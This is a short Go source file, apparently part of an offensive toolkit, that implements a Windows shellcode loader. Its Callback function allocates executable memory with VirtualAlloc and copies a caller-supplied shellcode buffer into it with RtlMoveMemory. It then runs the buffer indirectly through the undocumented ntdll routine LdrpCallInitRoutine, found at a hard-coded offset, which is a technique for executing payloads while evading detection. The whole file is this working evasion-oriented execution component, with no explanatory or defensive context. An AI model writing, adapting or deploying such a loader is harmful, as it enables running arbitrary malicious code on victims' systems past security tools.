package Loads

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT                  = 0x1000
	MEM_RESERVE                 = 0x2000
	PAGE_EXECUTE_READWRITE      = 0x40
	NULL                        = 0
	NTDLL_LDRPCALLINITRT_OFFSET = 0x000199bc
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	GetModuleHandleW  = kernel32.MustFindProc("GetModuleHandleW")
	GetProcAddress    = kernel32.MustFindProc("GetProcAddress")
	GetModuleHandleA  = kernel32.MustFindProc("GetModuleHandleA")
	GetCurrentProcess = kernel32.MustFindProc("GetCurrentProcess")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

type lpCallInitRoutine func(size_t uintptr, size_t1 uintptr, size_t2 uintptr) uintptr
type pLdrpCallInitRoutine func(lpCallInitRoutine, size_t1, uint32, size_t uintptr) byte

func Callback(shellcode []byte) {
	GetCurrentProcess.Call()

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	hNtdll, _ := syscall.LoadLibrary("ntdll")
	LdrpCallInitRoutine := (*pLdrpCallInitRoutine)(unsafe.Pointer(uintptr(hNtdll) + NTDLL_LDRPCALLINITRT_OFFSET))
	syscall.SyscallN(uintptr(unsafe.Pointer(LdrpCallInitRoutine)), 4, addr, 0, 0, 0)
}
